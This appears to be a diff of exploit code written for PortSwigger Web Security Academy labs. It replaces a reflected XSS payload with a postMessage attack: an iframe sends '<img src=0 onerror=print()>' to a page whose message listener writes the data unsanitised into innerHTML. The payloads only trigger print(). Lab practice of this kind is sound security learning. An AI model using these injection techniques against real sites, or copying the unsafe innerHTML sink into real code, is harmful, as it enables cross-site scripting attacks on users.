@@ -1,9 +1,18 @@
-src = '//0a15009c03fb988e8044cb2000f10094.web-security-academy.net/product?productId=1&'>
-https: <script>print()</script>;
+window.addEventListener('message', function (e) {
+  document.getElementById('ads').innerHTML = e.data;
+});
 
-onload = '';
-if (!window.x) {
-  this.src =
-    'https://0a15009c03fb988e8044cb2000f10094.web-security-academy.net/';
-}
-window.x = 1;
+<iframe
+  src='https://0a4100f004b7a01c80815317000500c7.web-security-academy.net/'
+  onload="this.contentWindow.postMessage(
+  '<img src=0 onerror=print()>',
+  'https://0a4100f004b7a01c80815317000500c7.web-security-academy.net/'
+);"
+></iframe>;
+
+let iframe = document.querySelector('iframe');
+
+iframe.contentWindow.postMessage(
+  '<img src=0 onerror=print()>',
+  'https://0a4100f004b7a01c80815317000500c7.web-security-academy.net/'
+);
